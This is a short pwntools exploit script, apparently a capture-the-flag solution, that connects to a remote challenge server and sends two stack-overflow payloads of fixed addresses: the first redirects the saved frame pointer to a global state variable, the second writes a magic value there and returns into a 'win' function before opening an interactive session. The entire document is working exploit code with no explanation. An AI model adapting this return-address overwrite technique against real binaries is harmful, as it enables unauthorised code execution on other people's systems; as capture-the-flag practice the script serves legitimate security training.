from pwn import *

context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'], aslr=True)

#p = process('./chall')
#p = gdb.debug('./chall', gdbscript='b *vuln+46\nc\n')
p = remote('chall.lac.tf', 31593)

p.recvuntil(b'?')

#payload = asm('''mov rax, 0x404540''')

#payload  = b'A' * 0x28

payload = p64(0x4011bd)
payload += p64(0x4012b2)
payload += b'A'*0x10
payload += p64(0x40455f) # rbp = state + 0x1f
payload += p64(0x4012d0) # ret addr

p.send(payload)

payload = p64(0xf1eeee2d) # state = 0xf1eeee2d
payload += b'A' * 0x1f
payload += p64(0x4011d6) # ret to win

p.send(payload)

p.interactive()
